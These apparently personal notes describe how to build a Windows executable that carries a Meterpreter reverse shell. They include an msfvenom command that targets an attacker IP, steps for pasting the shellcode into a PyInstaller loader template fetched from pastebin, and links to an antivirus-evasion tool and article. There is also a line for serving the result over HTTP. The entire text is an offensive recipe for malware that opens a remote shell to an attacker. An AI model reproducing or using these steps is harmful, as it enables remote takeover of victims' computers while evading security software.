
Create newfile and copy the rawcode for pyinstaller from pastebin.com/rrhcGeHh

Generate new shell code with msfvenom

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attackerIP> -a x86 -f c

replace the section of pyinstaller "shellcode = bytearray(" with the code generated.

Save the file.

use pyinstaller to create the exeuctable.

NOTE: you must be on the OS that you inted to make the executable for.

**Windows**

https://www.python.org/
https://datatofish.com/executable-pyinstaller/




#phantom evasion
https://github.com/oddcod3/Phantom-Evasion
https://www.securitynewspaper.com/2019/03/04/bypass-antivirus-detection-with-phantom-payloads/


For testing:

python -m SimpleHTTP
